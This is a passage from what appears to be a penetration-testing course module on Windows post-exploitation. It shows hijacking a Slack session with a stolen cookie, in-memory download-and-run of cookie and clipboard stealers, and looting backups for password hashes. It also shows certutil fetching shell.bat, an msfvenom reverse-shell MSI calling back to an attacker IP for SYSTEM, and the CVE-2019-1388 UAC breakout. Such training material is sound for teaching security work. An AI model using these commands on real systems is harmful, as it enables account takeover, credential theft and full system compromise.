<p>Our target website is <code>slack.com</code>. Now that we have the cookie, we want to impersonate the user. Let&#39;s navigate to slack.com once the page loads, click on the icon for the Cookie-Editor extension, and modify the value of the <code>d</code> cookie with the value you have from the cookieextractor.py script. Make sure to click the save icon (marked in red in the image below).</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/replace-cookie.jpg" alt="text"></p>
<p>Once you have saved the cookie, you can refresh the page and see that you are logged in as the user.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/cookie-access.jpg" alt="text"></p>
<p>Now we are logged in as the user and can click on <code>Launch Slack</code>. We may get a prompt for credentials or other types of authentication information; we can repeat the above process and replace the cookie <code>d</code> with the same value we used to gain access the first time on any website that asks us for information or credentials.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/replace-cookie2.jpg" alt="text"></p>
<p>Once we complete this process for every website where we get a prompt, we need to refresh the browser, click on <code>Launch Slack</code> and use Slack in the browser.</p>
<p>After gaining access, we can use built-in functions to search for common words like passwords, credentials, PII, or any other information relevant to our assessment.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/search-creds-slack.jpg" alt="text"></p>
<p><strong>Cookie Extraction from Chromium-based Browsers</strong></p>
<p>The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with <a href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">Data Protection API (DPAPI)</a>. <code>DPAPI</code> is commonly used to encrypt data using information from the current user account or computer.</p>
<p>To get the cookie value, we&#39;ll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool <a href="https://github.com/djhohnstein/SharpChromium">SharpChromium</a> does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.</p>
<p>Let&#39;s use <a href="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1">Invoke-SharpChromium</a>, a PowerShell script created by <a href="https://twitter.com/ShitSecure">S3cur3Th1sSh1t</a> which uses reflection to load SharpChromium.</p>
<p><strong>PowerShell Script - Invoke-SharpChromium</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; IEX(<span class="hljs-keyword">New</span>-Object Net.WebClient).DownloadString(<span class="hljs-symbol">'https</span>://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb&gt; Invoke-SharpChromium -Command <span class="hljs-string">"cookies slack.com"</span>

[*] Beginning Google Chrome extraction.

[X] Exception: Could <span class="hljs-keyword">not</span> find <span class="hljs-keyword">file</span> <span class="hljs-symbol">'C</span>:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\<span class="hljs-keyword">Default</span>\Cookies'.

   at System.IO.__Error.WinIOError(Int32 errorCode, <span class="hljs-built_in">String</span> maybeFullPath)
   at System.IO.<span class="hljs-keyword">File</span>.InternalCopy(<span class="hljs-built_in">String</span> sourceFileName, <span class="hljs-built_in">String</span> destFileName, <span class="hljs-built_in">Boolean</span> overwrite, <span class="hljs-built_in">Boolean</span> checkout)
   at Utils.FileUtils.CreateTempDuplicateFile(<span class="hljs-built_in">String</span> filePath)
   at SharpChromium.ChromiumCredentialManager.GetCookies()
   at SharpChromium.Program.extract data(<span class="hljs-built_in">String</span> path, <span class="hljs-built_in">String</span> browser)
[*] Finished Google Chrome extraction.

[*] Done.
</code></pre>
<p>We got an error because the cookie file path that contains the database is hardcoded in <a href="https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47">SharpChromium</a>, and the current version of Chrome uses a different location.</p>
<p>We can modify the code of <code>SharpChromium</code> or copy the cookie file to where SharpChromium is looking.</p>
<p><code>SharpChromium</code> is looking for a file in <code>%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies</code>, but the actual file is located in <code>%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies</code> with the following command we will copy the file to the location SharpChromium is expecting.</p>
<p><strong>Copy Cookies to SharpChromium Expected Location</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; copy "<span class="hljs-formula">$env:LOCALAPPDATA<span class="hljs-tag">\<span class="hljs-name">Google</span></span><span class="hljs-tag">\<span class="hljs-name">Chrome</span></span><span class="hljs-tag">\<span class="hljs-name">User</span></span> Data<span class="hljs-tag">\<span class="hljs-name">Default</span></span><span class="hljs-tag">\<span class="hljs-name">Network</span></span><span class="hljs-tag">\<span class="hljs-name">Cookies</span></span>" "$</span>env:LOCALAPPDATA<span class="hljs-tag">\<span class="hljs-name">Google</span></span><span class="hljs-tag">\<span class="hljs-name">Chrome</span></span><span class="hljs-tag">\<span class="hljs-name">User</span></span> Data<span class="hljs-tag">\<span class="hljs-name">Default</span></span><span class="hljs-tag">\<span class="hljs-name">Cookies</span></span>"
</code></pre>
<p>We can now use Invoke-SharpChromium again to get a list of cookies in JSON format.</p>
<p><strong>Invoke-SharpChromium Cookies Extraction</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; Invoke-SharpChromium -Command <span class="hljs-string">"cookies slack.com"</span>

[*] Beginning Google Chrome extraction.

--- Chromium Cookie (<span class="hljs-string">User:</span> lab_admin) ---
<span class="hljs-string">Domain         :</span> slack.com
Cookies (JSON) :
[

&lt;SNIP&gt;

{
    <span class="hljs-string">"domain"</span>: <span class="hljs-string">".slack.com"</span>,
    <span class="hljs-string">"expirationDate"</span>: <span class="hljs-number">1974643257.67155</span>,
    <span class="hljs-string">"hostOnly"</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-string">"httpOnly"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"d"</span>,
    <span class="hljs-string">"path"</span>: <span class="hljs-string">"/"</span>,
    <span class="hljs-string">"sameSite"</span>: <span class="hljs-string">"lax"</span>,
    <span class="hljs-string">"secure"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-string">"session"</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-string">"storeId"</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-string">"value"</span>: <span class="hljs-string">"xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"</span>
},
{
    <span class="hljs-string">"domain"</span>: <span class="hljs-string">".slack.com"</span>,
    <span class="hljs-string">"hostOnly"</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-string">"httpOnly"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"d-s"</span>,
    <span class="hljs-string">"path"</span>: <span class="hljs-string">"/"</span>,
    <span class="hljs-string">"sameSite"</span>: <span class="hljs-string">"lax"</span>,
    <span class="hljs-string">"secure"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-string">"session"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-string">"storeId"</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-string">"value"</span>: <span class="hljs-string">"1659023172"</span>
},

&lt;SNIP&gt;

]

[*] Finished Google Chrome extraction.

[*] Done.
</code></pre>
<p>We can now use this cookie with cookie-editor as we did with Firefox.</p>
<p>Note: When copy/pasting the contents of a cookie, make sure the value is one line.</p>
<hr>
<h3 id="clipboard">Clipboard</h3>
<p>In many companies, network administrators use password managers to store their credentials and copy and paste passwords into login forms. As this doesn&#39;t involve <code>typing</code> the passwords, keystroke logging is not effective in this case. The <code>clipboard</code> provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard.</p>
<p>We can use the <a href="https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1">Invoke-Clipboard</a> script to extract user clipboard data. Start the logger by issuing the command below.</p>
<p><strong>Monitor the Clipboard with PowerShell</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">'https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1'</span>)
PS <span class="hljs-string">C:</span>\htb&gt; Invoke-ClipboardLogger
</code></pre>
<p>The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.</p>
<p><strong>Capture Credentials from the Clipboard with Invoke-ClipboardLogger</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session"><span class="hljs-attribute">PS</span> C:\htb&gt; Invoke-ClipboardLogger

https://portal.azure.com

Administrator<span class="hljs-variable">@something</span>.com

Sup9rC0mpl2xPa$<span class="hljs-variable">$ws0921lk</span>
</code></pre>
<p>Note: User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging.</p>
<hr>
<h3 id="roles-and-services">Roles and Services</h3>
<p>Services on a particular host may serve the host itself or other hosts on the target network. It is necessary to create a profile of each targeted host, documenting the configuration of these services, their purpose, and how we can potentially use them to achieve our assessment goals. Typical server roles and services include:</p>
<ul>
<li>File and Print Servers</li>
<li>Web and Database Servers</li>
<li>Certificate Authority Servers</li>
<li>Source Code Management Servers</li>
<li>Backup Servers</li>
</ul>
<p>Let&#39;s take <code>Backup Servers</code> as an example, and how, if we compromise a server or host with a backup system, we can compromise the network.</p>
<p><strong>Attacking Backup Servers</strong></p>
<p>In information technology, a <code>backup</code> or <code>data backup</code> is a copy of computer data taken and stored elsewhere so that it may be used to restore the original after a data loss event. Backups can be used to recover data after a loss due to data deletion or corruption or to recover data from an earlier time. Backups provide a simple form of disaster recovery. Some backup systems can reconstitute a computer system or other complex configurations, such as an Active Directory server or database server.</p>
<p>Typically backup systems need an account to connect to the target machine and perform the backup. Most companies require that backup accounts have local administrative privileges on the target machine to access all its files and services.</p>
<p>If we gain access to a <code>backup system</code>, we may be able to review backups, search for interesting hosts and restore the data we want.</p>
<p>As we previously discussed, we are looking for information that can help us move laterally in the network or escalate our privileges. Let&#39;s use <a href="https://restic.net/">restic</a> as an example. <code>Restic</code> is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.</p>
<p>To start working with <code>restic</code>, we must create a <code>repository</code> (the directory where backups will be stored). <code>Restic</code> checks if the environment variable <code>RESTIC_PASSWORD</code> is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.</p>
<p>We will use <code>restic 0.13.1</code> and back up the repository <code>C:\xampp\htdocs\webapp</code> in <code>E:\restic\</code> directory. To download the latest version of restic, visit <a href="https://github.com/restic/restic/releases/latest">https://github.com/restic/restic/releases/latest</a>. On our target machine, restic is located at <code>C:\Windows\System32\restic.exe</code>.</p>
<p>We first need to create and initialize the location where our backup will be saved, called the <code>repository</code>.</p>
<p><strong>restic - Initialize Backup Directory</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-string">\htb&gt;</span> mkdir E:<span class="hljs-string">\restic2;</span> restic.exe -r E:<span class="hljs-string">\restic2</span> init

    Directory: E:<span class="hljs-string">\</span>

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          <span class="hljs-number">8</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">16</span> PM                restic2
enter password <span class="hljs-keyword">for</span> <span class="hljs-keyword">new</span> repository:
enter password again:
created restic repository fdb2e6dd1d at E:<span class="hljs-string">\restic2</span>

Please note <span class="hljs-literal">that</span> knowledge <span class="hljs-keyword">of</span> your password <span class="hljs-keyword">is</span> required <span class="hljs-keyword">to</span> access
the repository. Losing your password means <span class="hljs-literal">that</span> your data <span class="hljs-keyword">is</span>
irrecoverably lost.
</code></pre>
<p>Then we can create our first backup.</p>
<p><strong>restic - Back up a Directory</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; $<span class="hljs-keyword">en</span><span class="hljs-variable">v:RESTIC_PASSWORD</span> = <span class="hljs-string">'Password'</span>
PS C:\htb&gt; restic.<span class="hljs-keyword">exe</span> -r E:\restic2\ backup C:\SampleFolder

repository fdb2e6dd opened successfully, password <span class="hljs-keyword">is</span> correct
created <span class="hljs-keyword">new</span> cache in C:\Users\jeff\AppData\Local\restic
<span class="hljs-keyword">no</span> parent snapshot found, will <span class="hljs-keyword">read</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">files</span>

File<span class="hljs-variable">s:</span>           <span class="hljs-number">1</span> <span class="hljs-keyword">new</span>,     <span class="hljs-number">0</span> changed,     <span class="hljs-number">0</span> unmodified
Dir<span class="hljs-variable">s:</span>            <span class="hljs-number">2</span> <span class="hljs-keyword">new</span>,     <span class="hljs-number">0</span> changed,     <span class="hljs-number">0</span> unmodified
Added <span class="hljs-keyword">to</span> the repo: <span class="hljs-number">927</span> B

processed <span class="hljs-number">1</span> <span class="hljs-keyword">files</span>, <span class="hljs-number">22</span> B in <span class="hljs-number">0</span>:<span class="hljs-number">00</span>
snapshot <span class="hljs-number">9971</span>e881 saved
</code></pre>
<p>If we want to back up a directory such as <code>C:\Windows</code>, which has some files actively used by the operating system, we can use the option <code>--use-fs-snapshot</code> to create a VSS (Volume Shadow Copy) to perform the backup.</p>
<p><strong>restic - Back up a Directory with VSS</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; restic.<span class="hljs-keyword">exe</span> -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password <span class="hljs-keyword">is</span> correct
<span class="hljs-keyword">no</span> parent snapshot found, will <span class="hljs-keyword">read</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">files</span>
creating VSS snapshot <span class="hljs-keyword">for</span> [<span class="hljs-keyword">c</span>:\]
successfully created snapshot <span class="hljs-keyword">for</span> [<span class="hljs-keyword">c</span>:\]
error: Open: <span class="hljs-keyword">open</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\confi<span class="hljs-variable">g:</span> Access <span class="hljs-keyword">is</span> denied.

File<span class="hljs-variable">s:</span>           <span class="hljs-number">0</span> <span class="hljs-keyword">new</span>,     <span class="hljs-number">0</span> changed,     <span class="hljs-number">0</span> unmodified
Dir<span class="hljs-variable">s:</span>            <span class="hljs-number">3</span> <span class="hljs-keyword">new</span>,     <span class="hljs-number">0</span> changed,     <span class="hljs-number">0</span> unmodified
Added <span class="hljs-keyword">to</span> the repo: <span class="hljs-number">914</span> B

processed <span class="hljs-number">0</span> <span class="hljs-keyword">files</span>, <span class="hljs-number">0</span> B in <span class="hljs-number">0</span>:<span class="hljs-number">02</span>
snapshot b0b6f4bb saved
Warnin<span class="hljs-variable">g:</span> at least one <span class="hljs-keyword">source</span> <span class="hljs-keyword">file</span> could not <span class="hljs-keyword">be</span> <span class="hljs-keyword">read</span>
</code></pre>
<p>Note: If the user doesn&#39;t have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.</p>
<p>We can also check which backups are saved in the repository using the <code>shapshot</code> command.</p>
<p><strong>restic - Check Backups Saved in a Repository</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
<span class="hljs-section">ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------</span>
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
<span class="hljs-section">afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
--------------------------------------------------------------------------------------</span>
3 snapshots
</code></pre>
<p>We can restore a backup using the ID.</p>
<p><strong>restic - Restore a Backup with ID</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-string">\htb&gt;</span> restic.exe -r E:<span class="hljs-string">\restic2\</span> restore <span class="hljs-number">9971e</span>881 --target C:<span class="hljs-string">\Restore</span>

repository fdb2e6dd opened successfully, password <span class="hljs-keyword">is</span> correct
restoring &lt;Snapshot <span class="hljs-number">9971e</span>881 <span class="hljs-keyword">of</span> [C:<span class="hljs-string">\SampleFolder]</span> at <span class="hljs-number">2022</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span> <span class="hljs-number">14</span>:<span class="hljs-number">18</span>:<span class="hljs-number">59.4715994</span> -<span class="hljs-number">0700</span> PDT <span class="hljs-keyword">by</span> PILLAGING-WIN01<span class="hljs-string">\jeff@PILLAGING-WIN01&gt;</span> <span class="hljs-keyword">to</span> C:<span class="hljs-string">\Restore</span>
</code></pre>
<p>If we navigate to <code>C:\Restore</code>, we will find the directory structure where the backup was taken. To get to the <code>SampleFolder</code> directory, we need to navigate to <code>C:\Restore\C\SampleFolder</code>.</p>
<p>We need to understand our targets and what kind of information we are looking for. If we find a backup for a Linux machine, we may want to check files like <code>/etc/shadow</code> to crack users&#39; credentials, web configuration files, <code>.ssh</code> directories to look for SSH keys, etc.</p>
<p>If we are targeting a Windows backup, we may want to look for the SAM &amp; SYSTEM hive to extract local account hashes. We can also identify web application directories and common files where credentials or sensitive information is stored, such as web.config files. Our goal is to look for any interesting files that can help us archive our goal.</p>
<p>Note: restic works similarly in Linux. If we don&#39;t know where restic snapshots are saved, we can look in the file system for a directory named snapshots. Keep in mind that the environment variable may not be set. If that&#39;s the case, we will need to provide a password to restore the files.</p>
<p>Hundreds of applications and methods exist to perform backups, and we cannot detail each. This <code>restic</code> case is an example of how a backup application could work. Other systems will manage a centralized console and special repositories to save the backup information and execute the backup tasks.</p>
<p>As we move forward, we will find different backup systems, and we recommend taking the time to understand how they work so that we can eventually abuse their functions for our purpose.</p>
<hr>
<h3 id="conclusion">Conclusion</h3>
<p>There are still plenty of locations, applications, and methods to obtain interesting information from a targeted host or a compromised network. We may find information in cloud services, network devices, IoT, etc. Be open and creative to explore your target and network and obtain the information you need using your methods and experience.</p>
<h2 id="miscellaneous-techniques">Miscellaneous Techniques</h2>
<hr>
<h3 id="living-off-the-land-binaries-and-scripts-lolbas-">Living Off The Land Binaries and Scripts (LOLBAS)</h3>
<p>The <a href="https://lolbas-project.github.io/">LOLBAS project</a> documents binaries, scripts, and libraries that can be used for &quot;living off the land&quot; techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker. Some interesting functionality may include:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Code execution</td>
<td>Code compilation</td>
<td>File transfers</td>
</tr>
<tr>
<td>Persistence</td>
<td>UAC bypass</td>
<td>Credential theft</td>
</tr>
<tr>
<td>Dumping process memory</td>
<td>Keylogging</td>
<td>Evasion</td>
</tr>
<tr>
<td>DLL hijacking</td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>Transferring File with Certutil</strong></p>
<p>One classic example is <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/">certutil.exe</a>, whose intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; certutil.exe -urlcache -<span class="hljs-built_in">split</span> -f <span class="hljs-keyword">http</span>://<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>:<span class="hljs-number">8080</span>/<span class="hljs-built_in">shell</span>.bat <span class="hljs-built_in">shell</span>.bat
</code></pre>
<p><strong>Encoding File with Certutil</strong></p>
<p>We can use the <code>-encode</code> flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.</p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\htb&gt; certutil -encode file1 encodedfile

<span class="hljs-keyword">Input</span> <span class="hljs-keyword">Length</span> = <span class="hljs-number">7</span>
Output <span class="hljs-keyword">Length</span> = <span class="hljs-number">70</span>
CertUtil: -encode command completed successfully
</code></pre>
<p><strong>Decoding File with Certutil</strong></p>
<p>Once the new file has been created, we can use the <code>-decode</code> flag to decode the file back to its original contents.</p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\htb&gt; certutil -decode encodedfile file2

<span class="hljs-keyword">Input</span> <span class="hljs-keyword">Length</span> = <span class="hljs-number">70</span>
Output <span class="hljs-keyword">Length</span> = <span class="hljs-number">7</span>
CertUtil: -decode command completed successfully.
</code></pre>
<p>A binary such as <a href="https://lolbas-project.github.io/lolbas/Binaries/Rundll32/">rundll32.exe</a> can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.</p>
<p>It is worth reviewing this project and becoming familiar with as many binaries, scripts, and libraries as possible. They could prove to be very useful during an evasive assessment, or one in which the client restricts us to only a managed Windows workstation/server instance to test from.</p>
<hr>
<h3 id="always-install-elevated">Always Install Elevated</h3>
<p>This setting can be set via Local Group Policy by setting <code>Always install with elevated privileges</code> to <code>Enabled</code> under the following paths.</p>
<ul>
<li><code>Computer Configuration\Administrative Templates\Windows Components\Windows Installer</code></li>
<li><code>User Configuration\Administrative Templates\Windows Components\Windows Installer</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/67/alwaysinstall.png" alt="image"></p>
<p><strong>Enumerating Always Install Elevated Settings</strong></p>
<p>Let&#39;s enumerate this setting.</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; reg query HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller

HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller
    AlwaysInstallElevated    REG_DWORD    0x1
</code></pre>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; reg query HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller

HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller
    AlwaysInstallElevated    REG_DWORD    0x1
</code></pre>
<p>Our enumeration shows us that the <code>AlwaysInstallElevated</code> key exists, so the policy is indeed enabled on the target system.</p>
<p><strong>Generating MSI Package</strong></p>
<p>We can exploit this by generating a malicious <code>MSI</code> package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ msfvenom -p windows/</span>shell_reverse_tcp lhost=<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span> lport=<span class="hljs-number">9443</span> -f msi &gt; aie.msi

[-] No platform was selected, choosing <span class="hljs-string">Msf:</span>:<span class="hljs-string">Module:</span>:<span class="hljs-string">Platform:</span>:Windows from the payload
[-] No arch selected, selecting <span class="hljs-string">arch:</span> x86 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-string">size:</span> <span class="hljs-number">324</span> bytes
Final size of msi <span class="hljs-string">file:</span> <span class="hljs-number">159744</span> bytes
</code></pre>
<p><strong>Executing MSI Package</strong></p>
<p>We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; msiexec /i c:<span class="hljs-symbol">\u</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\d</span>esktop<span class="hljs-symbol">\a</span>ie.msi /quiet /qn /norestart
</code></pre>
<p><strong>Catching Shell</strong></p>
<p>If all goes to plan, we will receive a connection back as <code>NT AUTHORITY\SYSTEM</code>.</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lnvp <span class="hljs-number">9443</span>

listening on [any] <span class="hljs-number">9443</span> ...
connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>] from (<span class="hljs-symbol">UNKNOWN</span>) [<span class="hljs-number">10.129</span><span class="hljs-number">.43</span><span class="hljs-number">.33</span>] <span class="hljs-number">49720</span>
<span class="hljs-symbol">Microsoft</span> <span class="hljs-symbol">Windows</span> [<span class="hljs-symbol">Version</span> <span class="hljs-number">10.0</span><span class="hljs-number">.18363</span><span class="hljs-number">.592</span>]
(c) <span class="hljs-number">2019</span> <span class="hljs-symbol">Microsoft</span> <span class="hljs-symbol">Corporation</span>. <span class="hljs-symbol">All</span> rights reserved.

<span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Windows</span>\system32&gt;whoami

whoami
nt authority\system
</code></pre>
<p>This issue can be mitigated by disabling the two Local Group Policy settings mentioned above.</p>
<hr>
<h3 id="cve-2019-1388">CVE-2019-1388</h3>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1388">CVE-2019-1388</a> was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable&#39;s certificate, opening the Windows certificate dialog when a user clicks the link. The <code>Issued By</code> field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) <code>1.3.6.1.4.1.311.2.1.10</code>. This OID value is identified in the <a href="https://docs.microsoft.com/en-us/windows/win32/api/wintrust/">wintrust.h</a> header as <a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject">SPC_SP_AGENCY_INFO_OBJID</a> which is the <code>SpcSpAgencyInfo</code> field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable (<a href="https://packetstormsecurity.com/files/14437/hhupd.exe.html">hhupd.exe</a>) that contains a certificate with the <code>SpcSpAgencyInfo</code> field populated with a hyperlink.</p>
<p>When we click on the hyperlink, a browser window will launch running as <code>NT AUTHORITY\SYSTEM</code>. Once the browser is opened, it is possible to &quot;break out&quot; of it by leveraging the <code>View page source</code> menu option to launch a <code>cmd.exe</code> or <code>PowerShell.exe</code> console as SYSTEM.</p>
<p>Let&#39;s run through the vulnerability in practice.</p>
<p>First right click on the <code>hhupd.exe</code> executable and select <code>Run as administrator</code> from the menu.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/hhupd.png" alt="image"></p>
<p>Next, click on <code>Show information about the publisher&#39;s certificate</code> to open the certificate dialog. Here we can see that the <code>SpcSpAgencyInfo</code> field is populated in the Details tab.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/hhupd\_details.png" alt="image"></p>
<p>Next, we go back to the General tab and see that the <code>Issued by</code> field is populated with a hyperlink. Click on it and then click <code>OK</code>, and the certificate dialog will close, and a browser window will launch.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/hhupd\_ok.png" alt="image"></p>
<p>If we open <code>Task Manager</code>, we will see that the browser instance was launched as SYSTEM.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/chrome\_system.png" alt="image"></p>
<p>Next, we can right-click anywhere on the web page and choose <code>View page source</code>. Once the page source opens in another tab, right-click again and select <code>Save as</code>, and a <code>Save As</code> dialog box will open.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/hhupd\_saveas.png" alt="image"></p>
<p>At this point, we can launch any program we would like as SYSTEM. Type <code>c:\windows\system32\cmd.exe</code> in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/hhupd\_cmd.png" alt="image"></p>
<p>Microsoft released a <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388">patch</a> for this issue in November of 2019. Still, as many organizations fall behind on patching, we should always check for this vulnerability if we gain GUI access to a potentially vulnerable system as a low-privilege user.</p>
<p>This <a href="https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a">link</a> lists all of the vulnerable Windows Server and Workstation versions.</p>
<p>Note: The steps above were done using the Chrome browser and may differ slightly in other browsers.</p>
<hr>
<h3 id="scheduled-tasks">Scheduled Tasks</h3>
<p><strong>Enumerating Scheduled Tasks</strong></p>
<p>We can use the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks">schtasks</a> command to enumerate scheduled tasks on the system.</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt;  schtasks <span class="hljs-regexp">/query /</span>fo LIST /v
<span class="hljs-symbol">
Folder:</span> \
<span class="hljs-string">INFO:</span> There are no scheduled tasks presently available at your access level.
<span class="hljs-symbol">
Folder:</span> \Microsoft
<span class="hljs-string">INFO:</span> There are no scheduled tasks presently available at your access level.
<span class="hljs-symbol">
Folder:</span> \Microsoft\Windows
<span class="hljs-string">INFO:</span> There are no scheduled tasks presently available at your access level.
<span class="hljs-symbol">
